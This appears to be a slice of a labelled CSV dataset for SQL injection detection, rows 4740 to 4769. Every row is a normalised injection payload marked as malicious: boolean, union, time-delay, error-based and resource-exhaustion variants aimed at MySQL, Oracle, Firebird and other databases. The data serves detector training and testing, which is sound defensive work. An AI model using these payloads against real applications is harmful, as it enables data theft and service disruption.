row_index,payload_norm,label,sqli_type_hint
4740,"1"" ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( ""ldlp"" = ""ldlp",1,
4741,1'+ ( select 'phtz' where 3171 = 3171,1,
4742,1' ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ),1,
4743,"-1647' ) ) union all select 3030,3030,3030,3030,3030,3030,3030--",1,
4744,1' ) ) rlike sleep ( 5 ) and ( ( 'qitl' like 'qitl,1,
4745,"1' ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( 'ggiw' = 'ggiw",1,
4746,"1' in boolean mode ) union all select null,null,null,null,null,null,null,null#",1,
4747,1' ) and 1987 = 3756#,1,
4748,-9024 ) where 1686 = 1686 or 3069 = 8213--,1,
4749,-5995' ) ) or 6872 = 6872 and ( ( 'pywh' = 'pywh,1,
4750,1 ) ) as oqui where 3368 = 3368 order by 1--,1,
4751,"1%"" ) union all select null,null,null,null,null,null,null,null,null,null#",1,
4752,"1' ) as xagu where 9088 = 9088 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",1,
4753,1' in boolean mode ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1,
4754,"-4543"" ) or 3038 = 3038",1,
4755,1 ) where 3381 = 3381,1,
4756,"-6160' ) ) ) or make_set ( 1924 = 4415,4415 ) and ( ( ( 'hayr' = 'hayr",1,
4757,1 or sleep ( 5 ),1,
4758,1'+ ( select cxvy where 7421 = 7421,1,
4759,"-1439"" or 2849 = 8484 and ""pmdl"" = ""pmdl",1,
4760,1 ) ) as wrhe where 6120 = 6120 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1,
4761,"-8425"" ) ) or ( 6485 = 1127 ) *1127 and ( ( ""qruf"" = ""qruf",1,
4762,"1"" ) as drrx where 8633 = 8633 union all select null,null,null--",1,
4763,"1%"" ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( ""%"" = """,1,
4764,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""%"" = """,1,
4765,-8701%' ) ) or ( 4843 = 1690 ) *1690 and ( ( '%' = ',1,
4766,"1' ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'crus' = 'crus",1,
4767,"1"" and ( 3020 = 3020 ) *6703 and ""itpt"" = ""itpt",1,
4768,"1"" ) as upjw where 3880 = 3880 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
4769,"1"" ) where 3943 = 3943 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
